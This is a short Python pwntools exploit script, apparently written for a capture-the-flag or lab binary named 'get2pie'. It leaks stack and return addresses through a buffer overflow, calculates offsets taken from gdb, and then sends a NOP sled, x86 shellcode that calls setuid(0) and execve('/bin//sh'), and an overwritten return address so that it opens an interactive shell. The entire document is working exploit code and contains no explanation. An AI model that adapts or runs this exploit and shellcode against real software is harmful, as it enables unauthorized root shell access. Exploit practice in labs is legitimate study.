from pwn import *

#offset = b"A" * 52
offset = b"A" * 48
shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
nops = b"\x90" * max(0, 52 - len(shellcode))

context.terminal = ["kitty"]

p = process("./get2pie")

program_output = p.recvline(timeout=2)

#gdb.attach(p, "break *vuln+164")
p.sendline(offset)

response = p.recvline(timeout=2)
print(" ".join([str(hex(k)) for k in response]))

#p.interactive()


address = response[73::]
stack_address = address[:4] 
address = address[4:8]



main_ret_addr = u32(address.ljust(4, b"\x00"))
stack_address = u32(stack_address.ljust(4, b"\x00"))

main_base_adrr = main_ret_addr - 118 # gained from gdb
vuln_base_addr = main_base_adrr - 165 # gained from gdb
vuln_ret_addr = vuln_base_addr + 164 
#ffffcbc0

print(hex(main_ret_addr))
print(hex(main_base_adrr))
print(hex(vuln_base_addr))
print(hex(vuln_ret_addr))
print(hex(stack_address))

print("possible1 :" + hex(stack_address+56))
print("possible2 :" + hex(stack_address-66))

#Now craft the payload
payload = nops+shellcode + p32(stack_address-66)


#gdb.attach(p, "break *vuln+164")
p.sendline(payload)
p.interactive()

response = p.recvline(timeout=2)
